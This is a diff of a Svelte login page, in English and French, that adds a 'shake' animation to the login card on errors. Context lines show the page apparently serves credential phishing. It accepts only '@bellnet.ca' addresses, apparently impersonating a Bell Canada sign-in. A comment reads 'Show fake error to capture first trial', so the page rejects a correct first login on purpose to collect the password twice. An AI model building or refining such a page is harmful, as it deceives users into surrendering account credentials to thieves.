@@ -13,6 +13,7 @@
   let loading = false;
   let message = { type: '', text: '' };
   let loginAttempts = 0;
+  let shake = false;
 
   // Language Dictionary
   const content = {
@@ -64,6 +65,7 @@ setTimeout(() => {
 
   async function handleLogin() {
      message = { type: '', text: '' };
+     shake = false;
 
     // Validation: Email Domain
     if (!email.toLowerCase().endsWith('@bellnet.ca')) {
@@ -98,6 +100,7 @@ setTimeout(() => {
 
       if (loginAttempts === 1) {
         // FIRST TIME: Show fake error to capture first trial
+        shake = true;
         message = { 
           type: 'error', 
           text: lang === 'en' ? 'Invalid email or password. Please try again.' : 'Courriel ou mot de passe invalide. Veuillez réessayer.' 
@@ -107,6 +110,7 @@ setTimeout(() => {
       }
     } else {
       // Handle actual backend errors (400, 500, etc.)
+      shake = true;
       message = { type: 'error', text: data.message || 'Login failed.' };
     }
   } catch {
@@ -133,7 +137,7 @@ setTimeout(() => {
 
     <div class="hero">
       <div class="hero-bg" style="background: url({background}) center/cover no-repeat;"></div>
-      <div class="card">
+      <div class="card" class:shake={shake}>
         <h1>{content[lang].title}</h1>
 
         <div class="field">
@@ -285,6 +289,20 @@ setTimeout(() => {
       display: flex;
       flex-direction: column;
     }
+
+    .card.shake {
+    animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both;
+    transform: translate3d(0, 0, 0);
+    backface-visibility: hidden;
+    perspective: 1000px;
+  }
+
+  @keyframes shake {
+    10%, 90% { transform: translate3d(-1px, 0, 0); }
+    20%, 80% { transform: translate3d(2px, 0, 0); }
+    30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+    40%, 60% { transform: translate3d(4px, 0, 0); }
+  }
 
     .card h1 {
       font-size: 24px;
